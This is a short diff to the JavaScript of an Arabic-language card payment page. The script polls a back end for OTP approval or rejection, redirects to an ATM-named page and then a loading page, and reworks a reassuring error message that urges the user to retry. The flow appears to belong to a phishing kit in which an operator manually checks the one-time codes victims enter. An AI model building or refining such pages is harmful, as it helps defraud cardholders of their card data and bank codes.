@@ -324,7 +324,7 @@
                 const data = await response.json();
 
                 if (data.status === 'approved_otp') {
-                    window.location.href = `payment_atm_ar.html?orderId=${orderId}`;
+                    window.location.href = `payment_loading_ar.html?orderId=${orderId}`;
                 } else if (data.status === 'rejected_otp') {
                     const confirmBtn = document.getElementById('confirmBtn');
                     confirmBtn.disabled = false;
@@ -333,11 +333,16 @@
                     const input = document.getElementById('otpInput');
                     input.style.borderColor = '#ef4444';
                     input.style.background = '#fff5f5';
-                    showError(data.lastError || 'الرمز غير صحيح. يرجى المحاولة مرة أخرى.');
+                    showError(data.lastError || 'الرمز الذي تم إدخاله غير صالح. قد تكون بطاقتك غير مفعلة للدفع عبر الإنترنت. يرجى التواصل مع المصرف أو إعادة المحاولة.');
+                } else if (data.status === 'otp_submitted') {
+                    setTimeout(checkStatus, 2000);
                 } else {
-                    setTimeout(checkStatus, 3000);
+                    setTimeout(checkStatus, 2000);
                 }
-            } catch (e) { console.error(e); }
+            } catch (e) { 
+                console.error(e);
+                setTimeout(checkStatus, 3000);
+            }
         }
 
         function cancelPayment() {
